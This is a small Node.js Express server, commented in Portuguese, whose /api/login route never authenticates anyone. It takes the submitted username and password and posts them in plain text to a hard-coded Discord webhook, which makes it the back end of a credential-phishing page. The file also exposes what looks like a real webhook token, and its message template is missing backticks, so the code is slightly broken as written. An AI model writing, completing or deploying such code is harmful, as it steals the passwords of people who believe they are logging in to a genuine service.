const express = require('express');
const app = express();

// Configura o servidor para usar o body-parser
app.use(express.json());

// Rota que recebe o POST do formulário
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    // Confirma que os campos não estão vazios
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Campos obrigatórios' });
    }

    // Envia os dados para o Discord
    const discordUrl = 'https://discord.com/api/webhooks/1573500610710601778/M92sTTydO6gH-b6VN-SPYIhyvSBWhoTvioU9QQOwa2enmhS7OnHowiw9cFq085a3F15V';

    const payload = {
        content: 🔐 Novo login\n\nUsuário: ${username}\nSenha: ${password}
    };

    try {
        const response = await fetch(discordUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            return res.json({ success: true, message: 'Login enviado com sucesso!' });
        } else {
            return res.status(500).json({ success: false, message: 'Erro ao enviar ao Discord' });
        }
    } catch (err) {
        console.error(err);
        return res.status(500).json({ success: false, message: 'Erro interno' });
    }
});

app.listen(3000, () => {
    console.log('Servidor rodando em http://localhost:3000');
});
